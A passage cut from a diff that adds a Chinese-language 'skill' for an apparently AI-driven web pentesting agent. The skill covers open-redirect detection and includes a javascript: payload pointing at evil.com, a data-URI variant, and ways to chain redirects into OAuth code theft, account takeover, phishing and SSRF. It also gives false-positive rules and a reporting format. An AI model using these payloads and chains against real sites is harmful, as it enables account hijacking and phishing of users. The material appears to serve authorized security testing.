javascript:伪协议（前端跳转位）：javascript:window.location='https://evil.com'\n- data:text/html;base64（少数端点支持）\n3. 服务端 302 判定：http_request 看响应 Location 头；前端跳转判定：get_page_state 或响应体里的 location/window.location 赋值\n\n【链式升级（价值所在）】\n- OAuth/微信授权回调位：redirect_uri 含开放重定向 → 授权 code 转给攻击者 → 盗号（升高危/严重）\n- 钓鱼链：可信域名跳转 + 仿登录页 = 有效钓鱼（中危）\n- 服务端跟随重定向的入口（文件拉取/回调）→ 升级 SSRF（联动 SSRF skill）\n\n【误报排除】白名单校验拦截所有变体 = 已防护；仅跳转到业务内页面不算；参数仅用于前端路由 hash 不发请求不算。\nadd_board(type=vuln, detail=参数+payload+跳转证据+可否链式升级)。",
+    "enabled": true
+  }
+]
